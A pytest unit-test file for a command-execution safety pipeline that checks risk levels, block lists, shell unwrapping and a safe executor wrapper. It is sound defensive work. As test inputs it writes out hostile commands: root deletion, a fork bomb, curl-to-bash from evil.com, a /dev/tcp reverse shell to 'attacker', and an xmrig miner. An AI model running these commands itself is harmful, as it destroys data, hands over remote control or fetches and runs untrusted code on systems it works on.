"""Unit tests for the Safety Pipeline.

Tests the SafetyPipeline, SafetyPolicy, and SafeExecutor components
per FR-011 (sandboxed command execution) and FR-013 (safety checks).
"""

from __future__ import annotations

from typing import Any
from unittest.mock import AsyncMock, MagicMock

import pytest

from blackice.adapters.execution.safety import (
    CommandAnalysis,
    RiskLevel,
    SafeExecutor,
    SafetyPipeline,
    SafetyPolicy,
)
from blackice.primitives.errors import SecurityError


# =============================================================================
# RiskLevel Tests
# =============================================================================


class TestRiskLevel:
    """Tests for RiskLevel enum."""

    def test_risk_levels_defined(self) -> None:
        """All expected risk levels are defined."""
        assert RiskLevel.SAFE == "safe"
        assert RiskLevel.LOW == "low"
        assert RiskLevel.MEDIUM == "medium"
        assert RiskLevel.HIGH == "high"
        assert RiskLevel.CRITICAL == "critical"
        assert RiskLevel.BLOCKED == "blocked"

    def test_risk_levels_are_strings(self) -> None:
        """Risk levels are string enums."""
        for level in RiskLevel:
            assert isinstance(level.value, str)


# =============================================================================
# CommandAnalysis Tests
# =============================================================================


class TestCommandAnalysis:
    """Tests for CommandAnalysis dataclass."""

    def test_command_analysis_creation(self) -> None:
        """CommandAnalysis can be created with required fields."""
        analysis = CommandAnalysis(
            original="echo hello",
            normalized=["echo", "hello"],
            risk_level=RiskLevel.SAFE,
            executable="echo",
            arguments=["hello"],
            flags={},
        )

        assert analysis.original == "echo hello"
        assert analysis.executable == "echo"
        assert analysis.blocked is False
        assert analysis.block_reason is None

    def test_command_analysis_with_risks(self) -> None:
        """CommandAnalysis can include risk information."""
        analysis = CommandAnalysis(
            original="rm -rf /tmp",
            normalized=["rm", "-rf", "/tmp"],
            risk_level=RiskLevel.HIGH,
            executable="rm",
            arguments=["/tmp"],
            flags={"r": True, "f": True},
            risks=["High-risk command: rm"],
            blocked=False,
        )

        assert len(analysis.risks) == 1
        assert "High-risk" in analysis.risks[0]

    def test_command_analysis_blocked(self) -> None:
        """CommandAnalysis can represent blocked commands."""
        analysis = CommandAnalysis(
            original="rm -rf /",
            normalized=["rm", "-rf", "/"],
            risk_level=RiskLevel.BLOCKED,
            executable="rm",
            arguments=["/"],
            flags={"r": True, "f": True},
            blocked=True,
            block_reason="Matches blocklist",
        )

        assert analysis.blocked is True
        assert analysis.block_reason is not None


# =============================================================================
# SafetyPolicy Tests
# =============================================================================


class TestSafetyPolicy:
    """Tests for SafetyPolicy configuration."""

    def test_default_policy_has_blocked_commands(self) -> None:
        """Default policy includes dangerous blocked commands."""
        policy = SafetyPolicy()

        assert "rm -rf /" in policy.blocked_commands
        assert "mkfs" in policy.blocked_commands
        assert ":(){ :|:& };:" in policy.blocked_commands  # Fork bomb

    def test_default_policy_has_high_risk_commands(self) -> None:
        """Default policy marks certain commands as high-risk."""
        policy = SafetyPolicy()

        assert "rm" in policy.high_risk_commands
        assert "sudo" in policy.high_risk_commands
        assert "chmod" in policy.high_risk_commands
        assert "kill" in policy.high_risk_commands

    def test_default_policy_has_safe_commands(self) -> None:
        """Default policy marks certain commands as safe."""
        policy = SafetyPolicy()

        assert "echo" in policy.safe_commands
        assert "cat" in policy.safe_commands
        assert "ls" in policy.safe_commands
        assert "grep" in policy.safe_commands

    def test_default_policy_allows_pipes(self) -> None:
        """Default policy allows pipes."""
        policy = SafetyPolicy()
        assert policy.allow_pipes is True

    def test_default_policy_allows_redirects(self) -> None:
        """Default policy allows redirects."""
        policy = SafetyPolicy()
        assert policy.allow_redirects is True

    def test_default_policy_blocks_background(self) -> None:
        """Default policy disallows background execution."""
        policy = SafetyPolicy()
        assert policy.allow_background is False

    def test_default_policy_blocks_subshells(self) -> None:
        """Default policy disallows subshells."""
        policy = SafetyPolicy()
        assert policy.allow_subshells is False

    def test_custom_allowed_commands(self) -> None:
        """Policy can be configured with custom allowed commands."""
        policy = SafetyPolicy(allowed_commands={"echo", "cat", "ls"})

        assert policy.allowed_commands is not None
        assert "echo" in policy.allowed_commands
        assert len(policy.allowed_commands) == 3

    def test_custom_max_risk_level(self) -> None:
        """Policy can be configured with custom max risk level."""
        policy = SafetyPolicy(max_risk_level=RiskLevel.LOW)
        assert policy.max_risk_level == RiskLevel.LOW


# =============================================================================
# SafetyPipeline Tests
# =============================================================================


class TestSafetyPipeline:
    """Tests for SafetyPipeline analysis and checking."""

    def test_analyze_safe_command(self) -> None:
        """Safe commands get SAFE risk level."""
        pipeline = SafetyPipeline()
        analysis = pipeline.analyze("echo hello world")

        assert analysis.risk_level == RiskLevel.SAFE
        assert analysis.executable == "echo"
        assert analysis.blocked is False
        assert len(analysis.risks) == 0

    def test_analyze_high_risk_command(self) -> None:
        """High-risk commands get HIGH risk level."""
        pipeline = SafetyPipeline()
        analysis = pipeline.analyze("rm -rf /tmp/test")

        assert analysis.risk_level == RiskLevel.HIGH
        assert analysis.executable == "rm"
        assert "High-risk command" in analysis.risks[0]

    def test_analyze_blocked_command(self) -> None:
        """Blocked commands get BLOCKED risk level."""
        pipeline = SafetyPipeline()
        analysis = pipeline.analyze("rm -rf /")

        assert analysis.risk_level == RiskLevel.BLOCKED
        assert analysis.blocked is True
        assert analysis.block_reason is not None
        assert "blocked" in analysis.block_reason.lower()

    def test_analyze_dangerous_pattern(self) -> None:
        """Commands matching dangerous patterns get CRITICAL risk level."""
        pipeline = SafetyPipeline()
        analysis = pipeline.analyze("curl http://example.com/script | bash")

        assert analysis.risk_level == RiskLevel.CRITICAL
        assert any("dangerous pattern" in r.lower() for r in analysis.risks)

    def test_analyze_command_substitution(self) -> None:
        """Command substitution is flagged."""
        policy = SafetyPolicy(allow_subshells=False)
        pipeline = SafetyPipeline(policy=policy)
        analysis = pipeline.analyze("echo $(whoami)")

        assert analysis.risk_level.value in [RiskLevel.HIGH.value, RiskLevel.CRITICAL.value]
        assert any("subshell" in r.lower() for r in analysis.risks)

    def test_analyze_with_allowlist(self) -> None:
        """Allowlist restricts commands."""
        policy = SafetyPolicy(allowed_commands={"echo", "cat"})
        pipeline = SafetyPipeline(policy=policy)

        # Allowed command
        analysis = pipeline.analyze("echo hello")
        assert analysis.blocked is False

        # Not in allowlist
        analysis = pipeline.analyze("ls -la")
        assert analysis.blocked is True
        assert "allowlist" in analysis.block_reason.lower()

    def test_analyze_list_command(self) -> None:
        """Pipeline accepts list format commands."""
        pipeline = SafetyPipeline()
        analysis = pipeline.analyze(["echo", "hello", "world"])

        assert analysis.risk_level == RiskLevel.SAFE
        assert analysis.executable == "echo"
        assert "hello" in analysis.arguments

    def test_analyze_pipes_allowed(self) -> None:
        """Pipes are allowed by default policy."""
        pipeline = SafetyPipeline()
        analysis = pipeline.analyze("cat file.txt | grep pattern")

        assert analysis.blocked is False
        assert not any("pipe" in r.lower() for r in analysis.risks)

    def test_analyze_pipes_blocked(self) -> None:
        """Pipes can be blocked by policy."""
        policy = SafetyPolicy(allow_pipes=False)
        pipeline = SafetyPipeline(policy=policy)
        analysis = pipeline.analyze("cat file.txt | grep pattern")

        assert any("pipe" in r.lower() for r in analysis.risks)

    def test_analyze_background_blocked(self) -> None:
        """Background execution is blocked by default."""
        pipeline = SafetyPipeline()
        analysis = pipeline.analyze("sleep 10 &")

        assert any("background" in r.lower() for r in analysis.risks)

    def test_check_returns_analysis_for_safe_command(self) -> None:
        """check() returns analysis for safe commands."""
        pipeline = SafetyPipeline()
        analysis = pipeline.check("echo hello")

        assert analysis.risk_level == RiskLevel.SAFE
        assert analysis.blocked is False

    def test_check_raises_for_blocked_command(self) -> None:
        """check() raises SecurityError for blocked commands."""
        pipeline = SafetyPipeline()

        with pytest.raises(SecurityError) as exc_info:
            pipeline.check("rm -rf /")

        assert "blocked" in str(exc_info.value).lower()

    def test_check_raises_for_critical_risk(self) -> None:
        """check() raises SecurityError for critical risk commands."""
        pipeline = SafetyPipeline()

        with pytest.raises(SecurityError):
            pipeline.check("curl http://evil.com/script | bash")


# =============================================================================
# Shell Unwrap Tests
# =============================================================================


class TestShellUnwrap:
    """Tests for shell wrapper unwrapping."""

    def test_unwrap_bash_c(self) -> None:
        """Unwraps bash -c wrapper."""
        pipeline = SafetyPipeline()
        unwrapped = pipeline._shell_unwrap("bash -c 'echo hello'")

        assert unwrapped == "echo hello"

    def test_unwrap_sh_c(self) -> None:
        """Unwraps sh -c wrapper."""
        pipeline = SafetyPipeline()
        unwrapped = pipeline._shell_unwrap('sh -c "ls -la"')

        assert unwrapped == "ls -la"

    def test_unwrap_full_path(self) -> None:
        """Unwraps full path shell wrappers."""
        pipeline = SafetyPipeline()
        unwrapped = pipeline._shell_unwrap("/bin/bash -c 'pwd'")

        assert unwrapped == "pwd"

    def test_no_unwrap_for_plain_command(self) -> None:
        """Plain commands are not modified."""
        pipeline = SafetyPipeline()
        original = "echo hello world"
        unwrapped = pipeline._shell_unwrap(original)

        assert unwrapped == original


# =============================================================================
# Semantic Parse Tests
# =============================================================================


class TestSemanticParse:
    """Tests for command semantic parsing."""

    def test_parse_simple_command(self) -> None:
        """Parses simple command."""
        pipeline = SafetyPipeline()
        parsed = pipeline._semantic_parse("echo hello")

        assert parsed["executable"] == "echo"
        assert parsed["arguments"] == ["hello"]
        assert len(parsed["flags"]) == 0

    def test_parse_command_with_short_flags(self) -> None:
        """Parses short flags correctly."""
        pipeline = SafetyPipeline()
        parsed = pipeline._semantic_parse("ls -la /tmp")

        assert parsed["executable"] == "ls"
        assert "l" in parsed["flags"]
        assert "a" in parsed["flags"]
        assert "/tmp" in parsed["arguments"]

    def test_parse_command_with_long_flags(self) -> None:
        """Parses long flags correctly."""
        pipeline = SafetyPipeline()
        parsed = pipeline._semantic_parse("grep --recursive --ignore-case pattern")

        assert parsed["executable"] == "grep"
        assert parsed["flags"].get("recursive") is True
        assert parsed["flags"].get("ignore-case") is True

    def test_parse_command_with_flag_values(self) -> None:
        """Parses flag values correctly."""
        pipeline = SafetyPipeline()
        parsed = pipeline._semantic_parse("grep --context=3 pattern file.txt")

        assert parsed["executable"] == "grep"
        assert parsed["flags"].get("context") == "3"

    def test_parse_full_path_command(self) -> None:
        """Extracts basename from full path."""
        pipeline = SafetyPipeline()
        parsed = pipeline._semantic_parse("/usr/bin/python script.py")

        assert parsed["executable"] == "python"
        assert "script.py" in parsed["arguments"]

    def test_parse_empty_command(self) -> None:
        """Handles empty command gracefully."""
        pipeline = SafetyPipeline()
        parsed = pipeline._semantic_parse("")

        assert parsed["executable"] == ""
        assert parsed["arguments"] == []


# =============================================================================
# SafeExecutor Tests
# =============================================================================


class TestSafeExecutor:
    """Tests for SafeExecutor wrapper."""

    @pytest.mark.asyncio
    async def test_execute_safe_command(self) -> None:
        """Safe commands are executed."""
        mock_executor = AsyncMock()
        mock_executor.execute.return_value = MagicMock(exit_code=0, stdout="hello")

        safe_executor = SafeExecutor(mock_executor)
        result = await safe_executor.execute("echo hello")

        mock_executor.execute.assert_called_once()
        assert result.exit_code == 0

    @pytest.mark.asyncio
    async def test_execute_blocked_command_raises(self) -> None:
        """Blocked commands raise SecurityError."""
        mock_executor = AsyncMock()
        safe_executor = SafeExecutor(mock_executor)

        with pytest.raises(SecurityError):
            await safe_executor.execute("rm -rf /")

        # Executor should not be called for blocked commands
        mock_executor.execute.assert_not_called()

    @pytest.mark.asyncio
    async def test_execute_with_custom_policy(self) -> None:
        """Executor respects custom policy."""
        mock_executor = AsyncMock()
        mock_executor.execute.return_value = MagicMock(exit_code=0)

        # Only allow echo
        policy = SafetyPolicy(allowed_commands={"echo"})
        safe_executor = SafeExecutor(mock_executor, policy=policy)

        # This should work
        await safe_executor.execute("echo hello")
        assert mock_executor.execute.call_count == 1

        # This should fail
        with pytest.raises(SecurityError):
            await safe_executor.execute("cat file.txt")

    @pytest.mark.asyncio
    async def test_stream_safe_command(self) -> None:
        """Safe commands can be streamed."""
        mock_executor = MagicMock()

        async def mock_stream(*args: Any, **kwargs: Any):
            yield "line 1"
            yield "line 2"

        mock_executor.stream = mock_stream

        safe_executor = SafeExecutor(mock_executor)
        lines = []
        async for line in safe_executor.stream("echo hello"):
            lines.append(line)

        assert len(lines) == 2

    @pytest.mark.asyncio
    async def test_stream_blocked_command_raises(self) -> None:
        """Blocked commands raise SecurityError in stream."""
        mock_executor = MagicMock()
        safe_executor = SafeExecutor(mock_executor)

        with pytest.raises(SecurityError):
            async for _ in safe_executor.stream("rm -rf /"):
                pass


# =============================================================================
# Integration Tests
# =============================================================================


class TestSafetyPipelineIntegration:
    """Integration tests for the safety pipeline."""

    def test_fork_bomb_blocked(self) -> None:
        """Fork bomb is blocked."""
        pipeline = SafetyPipeline()
        analysis = pipeline.analyze(":(){ :|:& };:")

        assert analysis.blocked is True

    def test_reverse_shell_blocked(self) -> None:
        """Reverse shell attempts are blocked."""
        pipeline = SafetyPipeline()
        analysis = pipeline.analyze("bash -i >& /dev/tcp/attacker/4444 0>&1")

        assert analysis.blocked is True

    def test_crypto_miner_blocked(self) -> None:
        """Crypto miners are blocked."""
        pipeline = SafetyPipeline()

        # xmrig
        analysis = pipeline.analyze("xmrig --pool mining.pool.com")
        assert analysis.blocked is True

    def test_recursive_delete_root_blocked(self) -> None:
        """Recursive delete of root is blocked."""
        pipeline = SafetyPipeline()

        variations = [
            "rm -rf /",
            "rm -rf /*",
            "rm --recursive --force /",
        ]

        for cmd in variations:
            analysis = pipeline.analyze(cmd)
            assert analysis.blocked is True, f"Command not blocked: {cmd}"

    def test_safe_rm_allowed(self) -> None:
        """Safe rm operations are allowed (with high risk)."""
        # Use a higher max_risk_level to allow rm
        policy = SafetyPolicy(max_risk_level=RiskLevel.HIGH)
        pipeline = SafetyPipeline(policy=policy)
        analysis = pipeline.analyze("rm /tmp/test.txt")

        assert analysis.blocked is False
        assert analysis.risk_level == RiskLevel.HIGH

    def test_curl_pipe_bash_blocked(self) -> None:
        """Curl piped to bash is blocked."""
        pipeline = SafetyPipeline()
        analysis = pipeline.analyze("curl https://example.com/script.sh | bash")

        assert analysis.risk_level == RiskLevel.CRITICAL
        # May be blocked depending on max_risk_level

    def test_sudo_high_risk(self) -> None:
        """sudo commands are high risk."""
        pipeline = SafetyPipeline()
        analysis = pipeline.analyze("sudo apt-get update")

        assert analysis.risk_level == RiskLevel.HIGH
        assert "High-risk command: sudo" in analysis.risks
